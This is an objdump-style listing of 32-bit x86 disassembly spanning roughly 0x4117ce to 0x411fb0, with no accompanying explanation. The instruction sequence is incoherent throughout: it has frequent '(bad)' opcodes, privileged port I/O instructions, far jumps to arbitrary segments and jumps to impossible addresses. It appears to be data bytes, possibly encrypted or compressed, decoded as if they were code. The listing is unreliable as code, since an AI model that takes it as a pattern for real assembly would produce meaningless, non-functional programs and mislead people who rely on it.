  4117ce:	js     0x4117ff
  4117d0:	mov    bh,0x8c
  4117d2:	jp     0x41181a
  4117d4:	push   ebp
  4117d5:	cdq    
  4117d6:	add    BYTE PTR [edi+0x14b3ca6a],al
  4117dc:	lods   eax,DWORD PTR ds:[esi]
  4117dd:	js     0x411770
  4117df:	mov    esp,0xdb61b9dc
  4117e4:	enter  0xbbd2,0xe1
  4117e8:	in     al,dx
  4117e9:	mov    BYTE PTR [ebx+ebx*1+0x73],al
  4117ed:	outs   dx,BYTE PTR ds:[esi]
  4117ee:	mov    bh,0x60
  4117f0:	lea    edi,[ecx-0x8]
  4117f3:	sub    eax,0x3e6bed85
  4117f8:	retf   0x85d
  4117fb:	out    0xbc,eax
  4117fd:	fst    DWORD PTR ds:0x6b9ffe7d
  411803:	cmp    eax,0xee08963c
  411808:	mov    ds:0xcf17c683,al
  41180d:	sub    eax,eax
  41180f:	sar    DWORD PTR [edx-0x5c],0x79
  411813:	sbb    esi,DWORD PTR [esi]
  411815:	jmp    0x8959a459
  41181a:	test   DWORD PTR [edi],ebx
  41181c:	(bad)  
  41181d:	(bad)  
  41181e:	dec    edi
  41181f:	(bad)  
  411820:	hlt    
  411821:	mov    DWORD PTR [edx],ebx
  411823:	(bad)  
  411825:	jle    0x411825
  411827:	mov    ah,BYTE PTR [ecx-0x2adb1839]
  41182d:	aaa    
  41182e:	cdq    
  41182f:	sbb    BYTE PTR [esi-0x24cf9b53],bh
  411835:	(bad)  
  411836:	es dec edx
  411838:	jl     0x4117e3
  41183a:	pop    edx
  41183b:	mov    DWORD PTR [edx],esi
  41183d:	test   al,0x6a
  41183f:	adc    eax,0x8866a3b2
  411844:	sbb    dh,BYTE PTR [ebx+0x38205b71]
  41184a:	out    0x6e,al
  41184c:	pop    edi
  41184d:	push   esp
  41184e:	push   ebx
  41184f:	ss repz in al,0x4e
  411853:	mov    eax,ds:0x2606f1ce
  411858:	out    0x4b,eax
  41185a:	outs   dx,DWORD PTR ds:[esi]
  41185b:	push   ecx
  41185c:	aaa    
  41185d:	call   0x7d4a:0x598a856
  411864:	adc    BYTE PTR [edi+0x7cd37e06],cl
  41186a:	jmp    0xc077fa3c
  41186f:	fisttp QWORD PTR [eax]
  411871:	push   edi
  411872:	not    BYTE PTR [edx]
  411874:	jns    0x411851
  411876:	or     esi,DWORD PTR [edx+ebp*4-0x38060478]
  41187d:	and    BYTE PTR [ebp+0x15],ah
  411880:	or     ebx,DWORD PTR [eax+0x20aff7a1]
  411886:	or     BYTE PTR [edx-0x16],bl
  411889:	rol    DWORD PTR [edx+0x7d],0xfb
  41188d:	cli    
  41188e:	pop    eax
  41188f:	mov    ?,edi
  411891:	(bad)  
  411892:	imul   BYTE PTR [eax-0x597b7483]
  411898:	enter  0x4a9d,0xcc
  41189c:	pop    ebp
  41189d:	outs   dx,DWORD PTR ds:[esi]
  41189e:	icebp  
  41189f:	mov    ebx,DWORD PTR [edx+eiz*8]
  4118a2:	mov    ds:0xcd4bebb0,eax
  4118a7:	adc    BYTE PTR [ebp+0x440e2a5c],al
  4118ad:	jecxz  0x4118b3
  4118af:	jecxz  0x4118ff
  4118b1:	popf   
  4118b2:	sub    eax,0xc65d378f
  4118b7:	mov    bh,0xa
  4118b9:	ret    
  4118ba:	cmp    BYTE PTR [ebx],al
  4118bc:	loopne 0x4118ee
  4118be:	aas    
  4118bf:	and    edx,esi
  4118c1:	add    BYTE PTR [ebp-0x11b53b8c],al
  4118c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4118c8:	(bad)  
  4118c9:	cmp    DWORD PTR [esi],ebx
  4118cb:	dec    ecx
  4118cc:	ds mov bl,0xad
  4118cf:	test   DWORD PTR [edi+esi*8-0x4edeeeb0],0x3734997a
  4118da:	jmp    0xfc31:0x2331ec7d
  4118e1:	psubw  mm5,QWORD PTR [eax]
  4118e4:	call   0x528b:0xf591c523
  4118eb:	scas   al,BYTE PTR es:[edi]
  4118ec:	or     bl,ch
  4118ee:	jae    0x41189b
  4118f0:	cli    
  4118f1:	add    eax,0x93cfdce
  4118f6:	jne    0x4118be
  4118f8:	cmp    al,0xb1
  4118fa:	xchg   ebp,eax
  4118fb:	xor    al,0x54
  4118fd:	das    
  4118fe:	sub    al,BYTE PTR [ebp+0x33]
  411901:	in     al,0x5d
  411903:	(bad)  
  411905:	jg     0x411906
  411907:	inc    ebp
  411908:	rol    edi,0x2d
  41190b:	loopne 0x411984
  41190d:	mov    al,0xbf
  41190f:	jmp    0xfc4e:0x2196be6c
  411916:	dec    edi
  411917:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411918:	or     al,0x3e
  41191a:	ret    0x6b19
  41191d:	or     esi,esi
  41191f:	bound  edi,QWORD PTR [edx-0x1e]
  411922:	nop
  411923:	fistp  QWORD PTR [esi+0xc]
  411926:	stc    
  411927:	fs leave 
  411929:	xchg   ecx,eax
  41192a:	add    al,0xe0
  41192c:	or     eax,0xa8fef76
  411931:	cmp    ah,ah
  411933:	sub    eax,0x142b4038
  411938:	(bad)  
  411939:	(bad)  
  41193a:	cmp    edx,edi
  41193c:	dec    esi
  41193d:	call   0x616e1b7b
  411942:	xchg   BYTE PTR [ebx-0x76fff859],cl
  411948:	test   eax,0x45da0aa2
  41194d:	sub    dh,BYTE PTR [ecx+eax*4-0x3c]
  411951:	jbe    0x41198a
  411953:	fidiv  WORD PTR [edx-0x3e]
  411956:	adc    esi,eax
  411958:	(bad)  
  411959:	nop
  41195a:	or     eax,ebx
  41195c:	sub    al,0xf9
  41195e:	sub    DWORD PTR [ebx],ebp
  411960:	dec    ebp
  411961:	pop    esp
  411962:	jp     0x4119cb
  411964:	inc    esp
  411965:	cmp    bl,BYTE PTR [ecx+esi*1-0xbd1fa42]
  41196c:	outs   dx,BYTE PTR ds:[esi]
  41196d:	out    0x92,al
  41196f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411970:	mov    esi,0x80005262
  411975:	ret    0xd037
  411978:	loopne 0x4119f0
  41197a:	rcr    BYTE PTR [ebx-0x5],cl
  41197d:	fcmovb st,st(7)
  41197f:	and    eax,0xef23e142
  411984:	sub    BYTE PTR [edx+edx*4],cl
  411987:	mov    ss,WORD PTR [ecx+0x2121d46b]
  41198d:	xchg   ebp,eax
  41198e:	ss pop ds
  411990:	inc    ebp
  411991:	push   edx
  411992:	pusha  
  411993:	xchg   edx,eax
  411994:	or     al,0x40
  411996:	mov    edi,DWORD PTR [edi-0x24f58011]
  41199c:	xchg   esi,eax
  41199d:	adc    esp,DWORD PTR ds:0xf0b7e42c
  4119a3:	pop    DWORD PTR [esi]
  4119a5:	jmp    FWORD PTR [edx+0x2f3c8de2]
  4119ab:	dec    ecx
  4119ac:	adc    eax,0x760ab13d
  4119b1:	not    DWORD PTR [ebx+0x3c]
  4119b4:	pop    esp
  4119b5:	shl    DWORD PTR [edi+esi*8-0x27e53112],1
  4119bc:	in     al,dx
  4119bd:	imul   ebx,ecx,0xffffff9d
  4119c0:	jne    0x4119ea
  4119c2:	lods   al,BYTE PTR ds:[esi]
  4119c3:	xchg   esi,eax
  4119c4:	push   esp
  4119c5:	outs   dx,BYTE PTR ds:[esi]
  4119c6:	sub    BYTE PTR [ebx],al
  4119c8:	mov    al,ds:0xf041fc98
  4119cd:	push   DWORD PTR [ecx]
  4119cf:	sti    
  4119d0:	lock jno 0x411960
  4119d3:	retf   0x1a17
  4119d6:	mov    eax,0x1afcd106
  4119db:	adc    esi,DWORD PTR [ebx+0x66fe7823]
  4119e1:	sbb    edi,DWORD PTR [edx+0x71]
  4119e4:	adc    BYTE PTR [esi],cl
  4119e6:	dec    edx
  4119e7:	(bad)  
  4119e8:	fsub   QWORD PTR [edi-0x31]
  4119eb:	jae    0x411a37
  4119ed:	and    eax,0xb9b9db21
  4119f2:	dec    ah
  4119f4:	in     eax,0x3f
  4119f6:	ins    BYTE PTR es:[edi],dx
  4119f7:	data16 hlt 
  4119f9:	mov    edx,es
  4119fb:	scas   eax,DWORD PTR es:[edi]
  4119fc:	xor    eax,0x3c856a4e
  411a01:	dec    edx
  411a02:	push   edi
  411a03:	sub    DWORD PTR [edi-0x1c53efd5],esi
  411a09:	outs   dx,DWORD PTR ds:[esi]
  411a0a:	loop   0x411a40
  411a0c:	lods   eax,DWORD PTR ds:[esi]
  411a0d:	outs   dx,BYTE PTR ds:[esi]
  411a0e:	or     ch,dl
  411a10:	fbstp  TBYTE PTR [edx+0x619d2667]
  411a16:	ja     0x4119bc
  411a18:	inc    DWORD PTR [edx+0x330363ea]
  411a1e:	jbe    0x411a68
  411a20:	jnp    0x411a65
  411a22:	jl     0x411a6d
  411a24:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411a25:	sbb    DWORD PTR [edi-0x54],edx
  411a28:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411a29:	and    al,0xcf
  411a2b:	test   eax,0xff05fbcd
  411a30:	push   ecx
  411a31:	push   esp
  411a32:	xor    al,0xbf
  411a34:	xchg   ebx,eax
  411a35:	aaa    
  411a36:	mov    bh,0xc9
  411a38:	add    eax,0xe07d3175
  411a3d:	mov    esp,0xf5e450a7
  411a42:	outs   dx,DWORD PTR cs:[esi]
  411a44:	mov    dl,0x97
  411a46:	call   0x7b41:0xccd4dcdf
  411a4d:	dec    edx
  411a4e:	pushf  
  411a4f:	inc    esp
  411a50:	bound  edx,QWORD PTR [ecx-0x38]
  411a53:	jb     0x4119f0
  411a55:	daa    
  411a56:	sub    eax,0x7a7d8f6e
  411a5b:	mov    ebx,0x87f1dec0
  411a60:	dec    edx
  411a61:	push   ecx
  411a62:	push   cs
  411a63:	sub    BYTE PTR [ebp-0x3d],bh
  411a66:	scas   al,BYTE PTR es:[edi]
  411a67:	jge    0x411a17
  411a69:	sbb    al,0xfd
  411a6b:	mov    edx,0xe135f8e1
  411a70:	xor    BYTE PTR [ebx],dh
  411a72:	int3   
  411a73:	scas   eax,DWORD PTR es:[edi]
  411a74:	jno    0x411a3b
  411a76:	cmp    ebx,ebp
  411a78:	(bad)  
  411a79:	out    dx,al
  411a7a:	add    esi,DWORD PTR [ecx]
  411a7c:	pop    es
  411a7d:	push   esp
  411a7e:	popf   
  411a7f:	(bad)  
  411a80:	pop    esi
  411a81:	mov    esp,0x195d0c16
  411a86:	pop    ebx
  411a87:	rcl    BYTE PTR [eax],0x0
  411a8a:	jl     0x411ada
  411a8c:	mov    bh,0x1f
  411a8e:	popa   
  411a8f:	cdq    
  411a90:	mov    al,0x53
  411a92:	add    al,0xbc
  411a94:	add    dh,BYTE PTR [edx+ebp*4-0x7279ed45]
  411a9b:	push   ebx
  411a9c:	jne    0x411ab7
  411a9e:	mov    edx,DWORD PTR [esi-0x558cf872]
  411aa4:	push   cs
  411aa5:	xchg   DWORD PTR [edi],ebx
  411aa7:	ss cs ins DWORD PTR es:[edi],dx
  411aaa:	lea    esi,[ebx]
  411aac:	xchg   ebp,eax
  411aad:	add    eax,0x80af7aa9
  411ab2:	mov    esi,0x9dc9cde0
  411ab7:	add    BYTE PTR [ebx+edx*2-0x6d],dl
  411abb:	fnstenv [ebp-0x6a]
  411abe:	inc    eax
  411abf:	mov    bl,0xe3
  411ac1:	mov    ah,0x77
  411ac3:	imul   ebx,esi,0x6f2a713f
  411ac9:	cmp    edx,DWORD PTR [eax-0x3a]
  411acc:	daa    
  411acd:	jnp    0x411a5e
  411acf:	dec    ebp
  411ad0:	jecxz  0x411b0c
  411ad2:	add    DWORD PTR [esi+eax*1-0x42f2e2d9],edx
  411ad9:	dec    edi
  411ada:	jno    0x411ac2
  411adc:	fsub   QWORD PTR [esi]
  411ade:	in     al,dx
  411adf:	or     cl,BYTE PTR [esi+0x65]
  411ae2:	and    ch,ch
  411ae4:	ror    BYTE PTR [ecx],cl
  411ae6:	mov    ds:0x30bddc1b,al
  411aeb:	pop    es
  411aec:	push   ebp
  411aed:	jmp    0x411b06
  411aef:	xchg   edi,eax
  411af0:	jecxz  0x411b69
  411af2:	add    edi,DWORD PTR [eax-0x9b3e302]
  411af8:	jmp    0x411b2e
  411afa:	jne    0x411ae2
  411afc:	lods   al,BYTE PTR ds:[esi]
  411afd:	mov    dh,BYTE PTR [ebx-0x426066f1]
  411b03:	sub    esp,ecx
  411b05:	aam    0xeb
  411b07:	jb     0x411b67
  411b09:	mov    esi,0xd5981253
  411b0e:	daa    
  411b0f:	jmp    0x71a06f6b
  411b14:	xor    DWORD PTR [esi+edx*8+0x3f],edx
  411b18:	icebp  
  411b19:	pop    edx
  411b1a:	lods   eax,DWORD PTR ds:[esi]
  411b1b:	mov    ah,0xb2
  411b1d:	fs ins BYTE PTR es:[edi],dx
  411b1f:	dec    edi
  411b20:	out    dx,eax
  411b21:	test   al,0xcd
  411b23:	mov    al,ds:0xf2470f15
  411b28:	mov    dl,0x12
  411b2a:	cmp    esp,ebx
  411b2c:	mov    esi,0x1213971c
  411b31:	xor    ch,BYTE PTR [esi]
  411b33:	arpl   si,sp
  411b35:	stc    
  411b36:	div    BYTE PTR [esi]
  411b38:	xchg   ecx,eax
  411b39:	push   0x9cc9a1c0
  411b3e:	ins    BYTE PTR es:[edi],dx
  411b3f:	and    al,0xcb
  411b41:	push   edi
  411b42:	jle    0x411ae5
  411b44:	dec    eax
  411b45:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  411b46:	pop    ebx
  411b47:	mov    DWORD PTR [edi],edx
  411b49:	or     eax,0xace211b4
  411b4e:	aam    0xf7
  411b50:	imul   eax,esi,0x6a80e1bc
  411b56:	pushf  
  411b57:	xor    eax,DWORD PTR [eax-0x3d]
  411b5a:	test   BYTE PTR [eax-0x51838112],al
  411b60:	and    BYTE PTR [esi-0x7c],bh
  411b63:	mov    edi,0x580dfa4d
  411b68:	popa   
  411b69:	aas    
  411b6a:	scas   al,BYTE PTR es:[edi]
  411b6b:	mov    ah,0x14
  411b6d:	push   edx
  411b6e:	jmp    0xa623:0x6b2595f
  411b75:	stos   DWORD PTR es:[edi],eax
  411b76:	jnp    0x411b42
  411b78:	or     edx,DWORD PTR [eax-0x7999037a]
  411b7e:	iret   
  411b7f:	neg    ebp
  411b81:	or     bl,BYTE PTR [eax+ecx*4-0x10]
  411b85:	enter  0x2237,0x43
  411b89:	rcr    BYTE PTR [eax-0x3b],0xb8
  411b8d:	add    al,0x2d
  411b8f:	mov    ah,0x12
  411b91:	jle    0x411bec
  411b93:	(bad)  
  411b94:	xor    BYTE PTR [eax],dh
  411b96:	retf   
  411b97:	repnz xor ch,BYTE PTR [edx]
  411b9a:	mov    BYTE PTR [ecx+0x58],bl
  411b9d:	xchg   BYTE PTR [edi-0x56],al
  411ba0:	inc    ebp
  411ba1:	pop    ebx
  411ba2:	test   al,0x5e
  411ba4:	je     0x411b40
  411ba6:	jnp    0x411bad
  411ba8:	mov    WORD PTR ds:0x3cbac6ad,ss
  411bae:	or     eax,DWORD PTR [edx-0x6e]
  411bb1:	mov    bh,0x36
  411bb3:	adc    dh,0x6f
  411bb6:	mov    eax,0x7ca6c574
  411bbb:	xchg   DWORD PTR [ebx-0xb028a53],esp
  411bc1:	adc    ebx,ebx
  411bc3:	fcomp  st(2)
  411bc5:	retf   0x73bc
  411bc8:	push   0x8f3b56b5
  411bcd:	and    esp,DWORD PTR [ebx+0x4c]
  411bd0:	dec    edi
  411bd1:	xchg   BYTE PTR [edi],bl
  411bd3:	scas   eax,DWORD PTR es:[edi]
  411bd4:	mov    ah,0x67
  411bd6:	mov    dl,0x76
  411bd8:	cmc    
  411bd9:	nop
  411bda:	dec    ecx
  411bdb:	add    esp,DWORD PTR [ecx+0x7a]
  411bde:	inc    dh
  411be0:	fist   WORD PTR [ecx+0x7dfc7871]
  411be6:	push   eax
  411be7:	xchg   esp,eax
  411be8:	mov    esp,0xab73ac5d
  411bed:	xor    edi,DWORD PTR [edi+0x4d189551]
  411bf3:	xchg   esi,eax
  411bf4:	cmp    al,0x42
  411bf6:	fcmovb st,st(2)
  411bf8:	jge    0x411c63
  411bfa:	pushf  
  411bfb:	and    DWORD PTR [edx],eax
  411bfd:	bound  edx,QWORD PTR [esi+edx*2]
  411c00:	mov    dl,0xc8
  411c02:	adc    BYTE PTR [edx-0x48],dl
  411c05:	retf   
  411c06:	dec    esi
  411c07:	jne    0x411c1c
  411c09:	jg     0x411bd5
  411c0b:	hlt    
  411c0c:	imul   edi,DWORD PTR [ecx+0x11790cff],0x6d
  411c13:	int3   
  411c14:	xor    DWORD PTR [ecx],eax
  411c16:	add    al,0x86
  411c18:	push   ss
  411c19:	push   ecx
  411c1a:	and    al,BYTE PTR ds:0xfb042902
  411c20:	pusha  
  411c21:	outs   dx,BYTE PTR ds:[esi]
  411c22:	outs   dx,BYTE PTR ds:[esi]
  411c23:	gs pop ds
  411c25:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  411c27:	xchg   edi,eax
  411c28:	lock lock jecxz 0x411bf2
  411c2c:	retf   0x4cda
  411c2f:	addr16 push ecx
  411c31:	rcr    BYTE PTR [eax+0x31af506b],1
  411c37:	scas   eax,DWORD PTR es:[edi]
  411c38:	sub    BYTE PTR [ebx+0x2d],dl
  411c3b:	mov    bh,0xc1
  411c3d:	jp     0x411bff
  411c3f:	loope  0x411be4
  411c41:	enter  0xed44,0x84
  411c45:	fsub   QWORD PTR [eax-0x17]
  411c48:	daa    
  411c49:	sbb    bl,BYTE PTR [edx+0x997efa4]
  411c4f:	adc    DWORD PTR [edx+0x35ccffe1],edx
  411c55:	into   
  411c56:	and    BYTE PTR [ebx+0x69],0x0
  411c5a:	inc    esi
  411c5b:	or     al,0x91
  411c5d:	aad    0xad
  411c5f:	add    esi,edi
  411c61:	or     DWORD PTR [eax],esi
  411c63:	ror    DWORD PTR [ebx+0x6eb149ad],cl
  411c69:	cmc    
  411c6a:	mov    al,ds:0x96e63682
  411c6f:	dec    ebp
  411c70:	sbb    BYTE PTR [ebp-0x7d],ch
  411c73:	xor    DWORD PTR [ebp+0x5e],esp
  411c76:	push   ebp
  411c77:	ret    0xe30c
  411c7a:	sub    bh,BYTE PTR [edx+0x36]
  411c7d:	mov    dh,0x55
  411c7f:	add    cl,BYTE PTR [ebx-0x3e8619ee]
  411c85:	or     DWORD PTR [edx+0x7785ea20],ecx
  411c8b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411c8c:	js     0x411cc2
  411c8e:	or     al,0x63
  411c90:	push   eax
  411c91:	icebp  
  411c92:	repz cmp ebp,DWORD PTR [ecx-0x1e8c1a3]
  411c99:	jne    0x411c3d
  411c9b:	jnp    0x411ccf
  411c9d:	shr    esp,1
  411c9f:	js     0x411cb9
  411ca1:	jbe    0x411c4f
  411ca3:	jns    0x411cdd
  411ca5:	rcl    BYTE PTR [eax],1
  411ca7:	div    DWORD PTR [edx+0x3d555188]
  411cad:	xor    eax,0xa2f119c8
  411cb2:	mov    ebx,0xba6592e9
  411cb7:	add    al,0x15
  411cb9:	or     BYTE PTR [ebp-0x7132749f],cl
  411cbf:	xor    ecx,edi
  411cc1:	dec    edi
  411cc2:	mov    esi,0x33dbcf34
  411cc7:	jae    0x411d25
  411cc9:	sub    DWORD PTR [ebp-0x6b],eax
  411ccc:	mov    dh,0x4b
  411cce:	lods   al,BYTE PTR ds:[esi]
  411ccf:	pop    esi
  411cd0:	repz inc edi
  411cd2:	sbb    al,0x26
  411cd4:	push   eax
  411cd5:	pop    es
  411cd6:	outs   dx,DWORD PTR ds:[esi]
  411cd7:	jecxz  0x411c7b
  411cd9:	xor    ebp,DWORD PTR [edx+0x4e1925fe]
  411cdf:	mov    esi,0xf98de2c9
  411ce4:	popa   
  411ce5:	shr    esi,1
  411ce7:	or     eax,0xf2278668
  411cec:	out    0x15,al
  411cee:	mov    bl,0x93
  411cf0:	int    0xf3
  411cf2:	scas   al,BYTE PTR es:[edi]
  411cf3:	fdivr  st,st(6)
  411cf5:	popa   
  411cf6:	dec    edi
  411cf7:	pusha  
  411cf8:	jl     0x411cef
  411cfa:	xor    eax,0x958f027
  411cff:	(bad)  
  411d00:	out    0xfe,eax
  411d02:	pop    ds
  411d03:	or     BYTE PTR [edx+ecx*8+0x44928936],0x20
  411d0b:	fmulp  st(3),st
  411d0d:	cdq    
  411d0e:	pop    edx
  411d0f:	mov    cl,0xb5
  411d11:	popa   
  411d12:	jnp    0x411cd4
  411d14:	add    eax,0xdce9bfa9
  411d19:	mov    ecx,0x23044725
  411d1e:	addr16 mov dh,0x56
  411d21:	pushf  
  411d22:	pop    ebp
  411d23:	pop    ebp
  411d24:	pop    ss
  411d25:	cmp    bh,BYTE PTR [eax+0xe]
  411d28:	inc    ebx
  411d29:	push   0x28adfb40
  411d2e:	mov    ds:0xdecea5b6,al
  411d33:	adc    DWORD PTR [ebp+0x14d832ba],0xc5b87c44
  411d3d:	in     eax,0xbe
  411d3f:	lods   eax,DWORD PTR ds:[esi]
  411d40:	mov    bh,BYTE PTR [esi]
  411d42:	mov    ecx,0x44d9f74f
  411d47:	js     0x411ced
  411d49:	mov    edx,0xe5194e87
  411d4e:	cmp    ah,BYTE PTR [eax+edx*8-0x1ec40106]
  411d55:	pop    ds
  411d56:	and    eax,0xa9412d60
  411d5b:	fstp   DWORD PTR [eax+0x79]
  411d5e:	sbb    DWORD PTR [ebx],0xffffffca
  411d61:	test   DWORD PTR [ecx-0x319aa40a],esi
  411d67:	ss sbb al,0x4d
  411d6a:	test   eax,0xde4be695
  411d6f:	stc    
  411d70:	sub    edx,DWORD PTR [esi+eiz*8+0x2b]
  411d74:	sub    bh,BYTE PTR gs:[ecx+0x1e]
  411d78:	lahf   
  411d79:	stc    
  411d7a:	in     al,dx
  411d7b:	(bad)  
  411d7c:	cs ret 0x7564
  411d80:	xor    eax,0x26cd4e13
  411d85:	dec    ebp
  411d86:	xchg   esi,eax
  411d87:	and    bh,cl
  411d89:	scas   eax,DWORD PTR es:[edi]
  411d8a:	lods   al,BYTE PTR ds:[esi]
  411d8b:	mov    bl,BYTE PTR [edx+0x59c51428]
  411d91:	or     bh,bh
  411d93:	pop    esi
  411d94:	fwait
  411d95:	dec    edi
  411d96:	in     al,0x9a
  411d98:	xchg   esi,eax
  411d99:	and    al,0x62
  411d9b:	mov    cl,0x61
  411d9d:	adc    ch,bl
  411d9f:	cmp    DWORD PTR [edx+0x6e],ebp
  411da2:	jmp    0xba05:0xbf2b617c
  411da9:	or     eax,0xca724bda
  411dae:	sub    DWORD PTR [ecx+0x50],edi
  411db1:	or     eax,0xec685727
  411db6:	shl    BYTE PTR [edx],1
  411db8:	imul   DWORD PTR [ebx-0x5da85675]
  411dbe:	and    ebp,edi
  411dc0:	sub    BYTE PTR [ecx],dh
  411dc2:	jno    0x411e0a
  411dc4:	(bad)  
  411dc5:	fnstenv [esi-0x36]
  411dc8:	test   BYTE PTR [ebp-0x40],0x45
  411dcc:	rcr    DWORD PTR [eax+0x602c69fe],cl
  411dd2:	or     DWORD PTR [esi-0x3703d4cd],eax
  411dd8:	mov    bh,0x8e
  411dda:	int3   
  411ddb:	imul   eax,DWORD PTR [ebp-0x1d],0x1d
  411ddf:	cmp    eax,0xd87df354
  411de4:	add    esp,0xffffffd9
  411de7:	inc    edx
  411de8:	xchg   ebx,eax
  411de9:	fs (bad) 
  411deb:	js     0x411deb
  411ded:	test   DWORD PTR [ebx],edx
  411def:	add    BYTE PTR ds:0x4a390b87,bl
  411df5:	int    0x70
  411df7:	es inc esi
  411df9:	lahf   
  411dfa:	ja     0x411e1c
  411dfc:	das    
  411dfd:	inc    edi
  411dfe:	lea    esi,[ebx+eiz*4+0x60b60273]
  411e05:	push   cs
  411e06:	adc    BYTE PTR [eax+0x79],al
  411e09:	mov    dl,0xb2
  411e0b:	or     DWORD PTR [ebx-0x6dc59812],eax
  411e11:	mov    esp,0xa2b15d09
  411e16:	cs jg  0x411da5
  411e19:	loopne 0x411de4
  411e1b:	scas   al,BYTE PTR es:[edi]
  411e1c:	or     BYTE PTR [edx],0xfc
  411e1f:	dec    edi
  411e20:	mov    eax,0x329bb48
  411e25:	aam    0x64
  411e27:	shl    BYTE PTR [edi+0x2c],1
  411e2a:	or     al,0xd7
  411e2c:	ja     0x411e62
  411e2e:	fsubr  QWORD PTR [ecx+0x2a]
  411e31:	and    DWORD PTR [esi-0x1089f78e],edx
  411e37:	repnz mov al,ds:0x497d02f9
  411e3d:	call   0x22d0:0xc11f5f31
  411e44:	or     BYTE PTR [edx+0x6335916f],ch
  411e4a:	sub    BYTE PTR [edx-0x217f8869],0x9f
  411e51:	mov    ds:0xac94a2c3,eax
  411e56:	or     al,0x14
  411e58:	pushf  
  411e59:	(bad)  
  411e5a:	jmp    0xeb261cd3
  411e5f:	aam    0xf8
  411e61:	or     DWORD PTR [esi+0x35],eax
  411e64:	ja     0x411dfd
  411e66:	xor    BYTE PTR [edx],bl
  411e68:	fs sub al,0xa6
  411e6b:	cmp    DWORD PTR [eax],esi
  411e6d:	mov    cl,0x6a
  411e6f:	fnstsw WORD PTR [edi+0x6d]
  411e72:	xor    ebx,DWORD PTR [ecx+eiz*4-0x6ea3a194]
  411e79:	or     BYTE PTR [edx-0x59],bh
  411e7c:	lahf   
  411e7d:	mov    edx,ecx
  411e7f:	pop    ebx
  411e80:	mov    edi,0x7d352a4e
  411e85:	jge    0x411eb5
  411e87:	mov    ds:0xdbed24f3,eax
  411e8c:	push   esp
  411e8d:	inc    ecx
  411e8e:	sub    eax,0xc56f6fcf
  411e93:	adc    BYTE PTR ds:0x96ad47b1,dh
  411e99:	ror    DWORD PTR fs:[esi+0x354ecc1],cl
  411ea0:	div    BYTE PTR [eax-0x5e3df5f1]
  411ea6:	in     al,dx
  411ea7:	dec    ebx
  411ea8:	sbb    BYTE PTR gs:[esi-0x5d],ah
  411eac:	inc    edi
  411ead:	(bad)  
  411eae:	mov    ah,0xe
  411eb0:	pop    eax
  411eb1:	popf   
  411eb2:	aaa    
  411eb3:	adc    eax,0x9db8c3a
  411eb8:	xchg   BYTE PTR [edx],dh
  411eba:	fcomp  QWORD PTR [ecx-0x52]
  411ebd:	jl     0x411ec6
  411ebf:	(bad)  
  411ec1:	push   0x1f6e615
  411ec6:	pop    ecx
  411ec7:	rcr    DWORD PTR [edx+0x47],1
  411eca:	jge    0x411ef4
  411ecc:	push   ebx
  411ecd:	push   ebx
  411ece:	cmp    edi,DWORD PTR [ecx-0x4b]
  411ed1:	or     DWORD PTR [eax],edi
  411ed3:	mov    ?,WORD PTR [ecx+ecx*4]
  411ed6:	inc    edx
  411ed7:	fistp  QWORD PTR [esp+ebp*2-0x29]
  411edb:	dec    ebx
  411edc:	push   0x68e1d0bc
  411ee1:	test   al,0x56
  411ee3:	das    
  411ee4:	sub    eax,DWORD PTR [edi]
  411ee6:	mov    esi,esp
  411ee8:	scas   eax,DWORD PTR es:[edi]
  411ee9:	adc    ah,ch
  411eeb:	test   BYTE PTR [esi-0x5791c439],0x1
  411ef2:	xchg   ebp,eax
  411ef3:	mov    ch,0xb0
  411ef5:	or     BYTE PTR [eax+0x3],ch
  411ef8:	jmp    0x7e12:0xf2b699bf
  411eff:	sbb    DWORD PTR [ebp+eax*4-0xfb3c9cf],esi
  411f06:	jb     0x411f05
  411f08:	dec    ebp
  411f09:	mov    edi,0x941d9db8
  411f0e:	adc    BYTE PTR [esi-0x3a],dh
  411f11:	jg     0x411f6c
  411f13:	popf   
  411f14:	lahf   
  411f15:	ret    0xb83e
  411f18:	out    0x85,eax
  411f1a:	jns    0x411ee9
  411f1c:	ja     0x411f7c
  411f1e:	dec    esp
  411f1f:	mov    al,ds:0xceacbe08
  411f24:	inc    eax
  411f25:	(bad)  
  411f26:	mov    ebp,0x839d14e4
  411f2b:	or     esp,esp
  411f2d:	sbb    esi,eax
  411f2f:	pushf  
  411f30:	push   0x6e92b60b
  411f35:	mov    dh,bh
  411f37:	mov    ah,0xb5
  411f39:	pop    ebx
  411f3a:	sbb    BYTE PTR [eax-0x7d],bl
  411f3d:	cmp    DWORD PTR [ecx-0x34969437],ebp
  411f43:	mov    cl,0xea
  411f45:	sub    cl,BYTE PTR ds:0x4b8161
  411f4b:	dec    edx
  411f4c:	cmp    al,0x54
  411f4e:	push   0x3ebd296d
  411f53:	xchg   edi,eax
  411f54:	xor    ah,BYTE PTR [ecx]
  411f56:	rcl    dl,0x12
  411f59:	test   bh,ah
  411f5b:	push   ebx
  411f5c:	sub    dl,BYTE PTR [ecx+0x445970ba]
  411f62:	sti    
  411f63:	cmp    al,bh
  411f65:	inc    esp
  411f66:	lods   eax,DWORD PTR ds:[esi]
  411f67:	mov    eax,ds:0xc5e54ea0
  411f6c:	sar    BYTE PTR [ecx+0x19],1
  411f6f:	cmp    al,0x3f
  411f71:	lods   al,BYTE PTR ds:[esi]
  411f72:	or     al,0x78
  411f74:	bound  ebp,QWORD PTR [ebx+0x74c1a52b]
  411f7a:	jnp    0x411f8c
  411f7c:	icebp  
  411f7d:	pop    eax
  411f7e:	sbb    al,0x15
  411f80:	xchg   ebx,eax
  411f81:	in     eax,0x2
  411f83:	das    
  411f84:	xchg   ecx,eax
  411f85:	cwde   
  411f86:	imul   esp,DWORD PTR [edx+0x622c9989],0xffffffd6
  411f8d:	dec    eax
  411f8e:	loop   0x411f4d
  411f90:	pop    ebp
  411f91:	jmp    0xec7e:0xf9e9469f
  411f98:	jbe    0x411f61
  411f9a:	adc    al,0xff
  411f9c:	mov    ecx,0x3136e547
  411fa1:	rol    BYTE PTR [ebx+eiz*8+0x5b034c6],cl
  411fa8:	fisubr WORD PTR [ecx+esi*1+0x3e]
  411fac:	rcr    ecx,0x51
  411faf:	pop    ebx
  411fb0:	fistp  DWORD PTR [eax]
